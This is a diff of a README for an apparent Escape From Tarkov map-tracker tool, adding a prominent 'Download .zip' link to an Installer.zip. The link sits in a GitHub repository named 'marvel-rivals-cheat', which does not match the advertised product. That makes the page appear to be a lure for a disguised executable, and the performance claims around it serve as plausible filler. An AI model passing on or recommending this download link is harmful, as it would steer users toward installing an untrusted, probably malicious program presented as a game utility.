@@ -189,13 +189,13 @@ To display your position correctly, you will have to select among the maps the o
 </div>
 <!-- 🚧✅ --->
 
-# <p align="center"> [Download .zip Tarkov Map Tracker](https://github.com/starlet62sherman/marvel-rivals-cheat/releases/download/Releases/Installer.zip)
-
 ## 🖥️ Platforms
 This software is only for **Windows** and is only helpful when you have Escape From Tarkov installed on your computer
 
 ## ⚡Performance
 I previously developed this application in Python, but I decided to recreate it in Golang for performance reasons
+
+# <p align="center"> [Download .zip Tarkov Map Tracker](https://github.com/starlet62sherman/marvel-rivals-cheat/releases/download/Releases/Installer.zip)
 
 Indeed, Golang allows me to manage the computer's resources more efficiently, ensuring that this application does not consume too much memory while running alongside Escape From Tarkov
 Based on my tests, the application can take from 80 Mb to 110 Mb of RAM depending on the **Speed** setting, which is good, since players need at least 16 Go of RAM to play the game
